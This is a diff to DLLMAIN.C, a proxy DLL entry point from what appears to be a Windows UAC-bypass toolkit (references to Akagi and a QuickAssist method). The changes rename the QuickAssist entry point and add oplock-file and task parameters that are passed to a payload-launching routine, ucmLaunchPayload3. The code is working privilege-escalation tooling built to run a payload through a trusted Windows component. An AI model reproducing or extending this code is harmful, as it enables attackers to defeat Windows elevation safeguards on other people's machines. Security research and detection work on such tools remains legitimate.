@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2025
+*  (C) COPYRIGHT AUTHORS, 2014 - 2026
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.71
 *
-*  DATE:        07 Jul 2025
+*  DATE:        21 Jul 2026
 *
 *  Proxy dll entry point.
 *
@@ -85,7 +85,7 @@ VOID DefaultPayload(
     // If this is default executable, show runtime info.
     //
     if ((lpParameter == NULL) || (cbParameter == 0)) {
-        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_TANGO)
+        if (g_SharedParams.QueryRuntimeInformation)
             ucmQueryRuntimeInfo(FALSE);
     }
 
@@ -372,21 +372,21 @@ BOOL WINAPI EntryPointSxsConsent(
 }
 
 /*
-* EntryPointBackupLocked
+* EntryPointQuickAssist
 *
 * Purpose:
 *
 * Entry point to be used by QuickAssist method.
 *
 */
-BOOL WINAPI EntryPointBackupLocked(
+BOOL WINAPI EntryPointQuickAssist(
     _In_ HINSTANCE hinstDLL,
     _In_ DWORD fdwReason,
     _In_ LPVOID lpvReserved
 )
 {
     BOOL bSharedParamsReadOk;
-    PWSTR lpParameter;
+    PWSTR lpParameter, lpOpLockFile = NULL, lpTask = NULL;
     ULONG cbParameter;
 
     UNREFERENCED_PARAMETER(lpvReserved);
@@ -409,13 +409,19 @@ BOOL WINAPI EntryPointBackupLocked(
         if (bSharedParamsReadOk) {
             lpParameter = g_SharedParams.szParameter;
             cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+            if (g_SharedParams.szOptionalParameter1[0] != 0)
+                lpOpLockFile = g_SharedParams.szOptionalParameter1;
+            if (g_SharedParams.szOptionalParameter2[0] != 0)
+                lpTask = g_SharedParams.szOptionalParameter2;
         }
         else {
             lpParameter = NULL;
             cbParameter = 0UL;
         }
 
-        ucmLaunchPayload3(lpParameter, cbParameter);
+        if (lpTask && lpOpLockFile) {
+            ucmLaunchPayload3(g_SharedParams.MethodId, lpParameter, cbParameter, lpOpLockFile, lpTask);
+        }
 
         //
         // Notify Akagi.
